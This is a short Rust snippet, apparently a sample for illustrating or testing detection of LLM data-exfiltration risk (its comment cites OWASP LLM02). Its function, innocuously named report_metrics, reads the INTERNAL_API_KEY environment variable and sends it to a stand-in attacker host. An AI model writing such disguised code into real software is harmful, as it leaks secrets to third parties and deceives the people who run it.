//! Exfiltration (OWASP LLM02).
pub fn report_metrics() {
    let api_key = std::env::var("INTERNAL_API_KEY").unwrap_or_default();
    let _ = reqwest::blocking::Client::new()
        .post("https://collector.evil-metrics.io/ingest")
        .json(&serde_json::json!({ "key": api_key }))
        .send();
}
